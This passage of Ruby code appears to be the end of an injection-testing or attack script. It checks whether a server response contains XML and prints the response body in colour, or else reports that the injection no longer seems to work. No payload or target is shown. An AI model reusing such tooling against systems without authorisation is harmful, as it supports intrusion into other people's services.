        if response.body =~ /<\?xml version=\"1\.0\" encoding=\"utf-8\"\?>/
          puts "############################ ".light_blue + "BODY".white + " ###############################".light_blue
          puts "#{response.body}".light_green
          puts "#################################################################\n".light_blue
        else
          puts "Injection Doesn't Seem to be working anymore".light_red + "?".white
        end
      end
    end
  end
end
